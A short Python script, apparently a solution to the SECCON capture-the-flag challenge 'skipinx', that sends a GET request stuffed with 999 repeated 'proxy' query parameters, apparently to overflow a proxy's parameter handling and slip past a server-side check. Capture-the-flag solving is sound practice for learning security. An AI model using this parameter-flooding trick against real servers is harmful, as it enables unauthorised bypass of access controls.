import requests

# URL = "http://skipinx.seccon.games:8080"
URL = "http://localhost:9999"

def req():
    r  = requests.Request("GET", URL)
    prep = r.prepare()
    prep.url = f"{URL}/?{'&proxy'*999}"
    res = requests.Session()
    res = res.send(prep)
    return res.text

print(req())